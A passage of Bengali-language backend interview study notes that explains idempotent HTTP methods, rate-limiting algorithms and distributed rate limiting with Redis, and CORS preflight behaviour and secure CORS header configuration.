- **Idempotent Methods:** `GET`, `PUT`, `DELETE`, `HEAD`, `OPTIONS` (একটি জিনিস ১০ বার ডিলিট কমান্ড দিলেও সেটি ডিলিটই থাকবে, নতুন করে কিছু হবে না)।
- **Non-Idempotent Methods:** `POST`, `PATCH` (আপনি ১০ বার POST করলে ডাটাবেসে ১০টি নতুন সারি তৈরি হবে; PATCH-ও নির্ভর করে implementation-এর ওপর)।

---
## 🚦 68. What is the role of rate limiting in HTTP-based APIs, and how is it implemented? 
**Rate Limiting** হলো কোনো ইউজার বা আইপিকে নির্দিষ্ট সময়ের মধ্যে একটি লিমিটের বেশি API কল করতে না দেওয়া (যেমন: মিনিটে ১০০ রিকোয়েস্ট)। এটি সার্ভারকে স্প্যামিং, ব্রুট-ফোর্স অ্যাটাক, এবং DDoS আক্রমণ থেকে রক্ষা করে সার্ভারের পারফরম্যান্স স্বাভাবিক রাখে।

### 🧮 What are common rate limiting algorithms (token bucket, leaky bucket, sliding window)?
- **Token Bucket:** প্রতিটি ইউজারের বালতিতে নির্দিষ্ট সংখ্যক টোকেন থাকে। রিকোয়েস্ট এলে টোকেন মাইনাস হয়। নির্দিষ্ট সময় পর আবার ফুল টোকেন রিফিল হয়।
- **Leaky Bucket:** বালতির নিচে একটি ছিদ্র থাকে যেখান দিয়ে ফিক্সড রেটে রিকোয়েস্টগুলো সার্ভারে ড্রপ হয় (যেমন প্রতি সেকেন্ডে ২টি)। ইউজার অতিরিক্ত রিকোয়েস্ট করলে বালতি উপচে পড়ে (Discard) যায়। এটি ট্রাফিককে খুব স্মুথ রাখে।
- **Sliding Window:** এটি ফিক্সড উইন্ডোর (যেমন ১২:০০ থেকে ১২:০১) সীমাবদ্ধতা কাটিয়ে একটি চলমান সময়ের ফ্রেম (যেমন গত ৬০ সেকেন্ডে) ব্যবহার করে রিকোয়েস্ট কাউন্ট করে, ফলে কোনোরকম সাডেন স্পাইক থাকে না।

### 🌐 How do you implement distributed rate limiting across multiple API servers?
যদি ব্যাকএন্ডে একাধিক সার্ভার বা মাইক্রোসার্ভিস (load balanced) থাকে, তবে লোকাল মেমোরি দিয়ে রেট লিমিট করলে কাজ হবে না।
- **সমাধান:** সমস্ত সার্ভার একটি সেন্ট্রাল ডেটাবেস বা ইন-মেমরি ক্যাশিং সিস্টেম (যেমন **Redis**) ব্যবহার করে রিকোয়েস্ট কাউন্ট করে। যখন ইউজার A সার্ভার-১ এ হিট করে, Redis এ কাউন্ট বাড়ে, আবার সার্ভার-২ এ হিট করলেও Redis থেকেই চেক হয়।

---
## 🌍 69. How do backend developers handle CORS (Cross-Origin Resource Sharing) in web applications? 
ব্রাউজারে একটি বিল্ট-ইন সিকিউরিটি সিস্টেম আছে যাকে বলা হয় Same-Origin Policy (SOP)। এটি একটি ডোমেইনকে (যেমন `frontend.com`) অন্য কোনো ডোমেইনের (যেমন `api.com`) ডাটা এক্সেস করতে দেয় না।
- ব্যাকএন্ড ডেভেলপাররা সার্ভার রেসপন্সে **CORS Headers** যুক্ত করে ব্রাউজারকে জানান যে "আমি নিরাপদ, তুমি অমুক ডোমেইনকে আমার ডাটা এক্সেস করতে দাও"।

### ✈️ What is a CORS preflight request and when is it triggered?
**Preflight Request** হলো ব্রাউজারের পাঠানো একটি ডামি বা চেক রিকোয়েস্ট।
- যখনই ব্রাউজার দেখে যে মূল রিকোয়েস্টটি কোনো সিম্পল রিকোয়েস্ট নয় (যেমন `PUT`, `DELETE` মেথড, অথবা কাস্টম হেডার বা বডিতে JSON পাঠানো হচ্ছে), তখন মূল রিকোয়েস্টটি পাঠানোর আগে ব্রাউজার অটোমেটিক একটি `OPTIONS` রিকোয়েস্ট সার্ভারে পাঠায়।
- এটি মূলত সার্ভারকে জিজ্ঞেস করে, "আমি কি এই ধরনের ডেটা অমুক মেথড দিয়ে পাঠাতে পারি?" সার্ভার অনুমতি দিলে তবেই মূল ডেটা পাঠানো হয়।

### 🎯 What is the difference between simple CORS requests and preflighted requests?
- **Simple Requests:** যদি মেথড `GET`, `POST` বা `HEAD` হয় এবং হেডারগুলোতে শুধু বেসিক জিনিস থাকে (যেমন `Content-Type: application/x-www-form-urlencoded`), তবে ব্রাউজার সরাসরি রিকোয়েস্ট পাঠিয়ে দেয়। কোনো প্রাক-চেক বা Preflight এর দরকার হয় না।
- **Preflighted Requests:** যদি কন্টেন্ট টাইপ `application/json` হয়, বা রিকোয়েস্টে `Authorization` (টোকেন) হেডার থাকে, তবে ব্রাউজার অবশ্যই আগে `OPTIONS` রিকোয়েস্ট বা Preflight পাঠাবে।

### 🔒 How do you securely configure CORS headers in production?
কখনোই প্রোডাকশনে `Access-Control-Allow-Origin: *` ব্যবহার করা উচিত নয়, কারণ এতে বিশ্বের যেকোনো সাইট আপনার এপিআই কল করতে পারবে।
- **নিরাপদ কনফিগারেশন:** 
  - `Access-Control-Allow-Origin: https://mywebsite.com` (শুধুমাত্র ফিক্সড ফ্রন্টএন্ড ডোমেইন উল্লেখ করা)।
  - `Access-Control-Allow-Methods: GET, POST` (শুধু দরকারি মেথডগুলো অ্যালাউ করা)।
  - যদি ইউজার কুকি বা সেশন ট্র্যাকিং দরকার হয়, তবে `Access-Control-Allow-Credentials: true` এনাবল করতে হয়।
